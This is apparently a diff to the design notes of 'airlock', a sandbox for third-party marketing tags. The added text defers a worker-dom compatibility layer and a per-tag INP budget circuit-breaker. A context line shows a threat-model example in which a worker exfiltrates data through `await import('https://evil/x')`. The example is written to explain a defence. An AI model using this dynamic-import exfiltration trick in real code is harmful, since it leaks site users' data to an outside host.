@@ -335,3 +335,25 @@ defense-in-depth strip. Recorded in [ADR-0013](decisions/adr-0013-alloy-consent-
   claim for ALL seam controls (ceiling / config-integrity / consent), not just consent — a `type:"module"`
   worker's `await import("https://evil/x")` exfiltrates via the specifier fetch, which no JS shim withholds;
   gated by a worker `connect-src` CSP (host-controlled response headers), not by these seam controls.
+
+## Performance thesis (R-008) — post-MVP4
+
+The DOM-cost-containment investigation ([R-008](research/R-008-costly-dom-martech-containment.md)) — how
+airlock contains costly-DOM martech (the INP/CWV thesis). Named deferred items:
+
+### Decision: worker-dom compatibility layer (POC-B) — DEFERRED
+**Deferred:** the short-term compatibility/migration layer (Lever 2) — run an **unmodified** third-party tag
+in a chamber against a virtual DOM (à la `@ampproject/worker-dom`), its computation off-thread, mutations
+budgeted onto the main thread. The thing that unlocks the martech long tail whose vendors won't rewrite. NOT
+the end-state (govern+schedule connectors are), and with **documented limits** (tags needing live layout
+reads / sync storage / their own `window` won't work). **Resolution trigger:** after POC-A (Lever 1, the
+scheduled-capability proof) lands its INP scoreboard + DOM-capability — then a worker-dom feasibility spike
+probes `@ampproject/worker-dom` (or a minimal mirror) against the R-007 real-stack tags. **Do not forget**
+(maintainer, 2026-09-01). Detail + the "won't work" set: R-008.
+
+### Decision: Lever 3 circuit-breaker (budget enforcement) — DEFERRED
+**Deferred:** POC-A builds Lever 3's **measurement** half (the before/after INP scoreboard). The
+**enforcement** half — a per-tag INP/TBT budget that throttles/trips a runaway tag, + the inspector surfacing
+"tag X cost you N ms" — is deferred. **Resolution trigger:** once the measurement rig exists (POC-A) and a
+tag is shown to blow a budget; also needs the "what does trip do (defer/throttle/kill), and does killing
+mid-mutation leave the DOM half-written?" question answered. Detail: R-008 Open questions.
